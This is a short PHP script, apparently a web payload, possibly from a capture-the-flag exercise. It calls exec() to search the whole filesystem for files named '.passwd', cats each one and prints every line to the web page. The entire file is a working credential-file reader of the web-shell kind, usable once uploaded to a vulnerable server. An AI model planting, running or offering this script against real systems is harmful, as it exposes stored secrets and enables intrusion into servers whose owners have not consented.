<?php

$fileName = ".passwd";
echo '--- Start ---<br/>';

foreach(myExec("find / -name \"" . $fileName . "\"") as $path) {
    echo getReturnLine() . '---------------------------' . getReturnLine();
    echo getReturnLine() . "<h1>Path : " . $path . "</h1>" . getReturnLine();
    myReadFile(myExec("cat " . $path));
    echo getReturnLine() .'---------------------------' . getReturnLine();
}

echo '<br/>--- End ---';

function myExec($cmd) {
    $output = "";
    exec($cmd , $output);
    return $output;
}

function myReadFile($fileStringArray) {
    $i = 1;
    foreach($fileStringArray as $line) {
        echo $i . ' - ' . $line . getReturnLine();
        $i++;
    }
}

function getReturnLine() {
    return '<br/>';
}

?>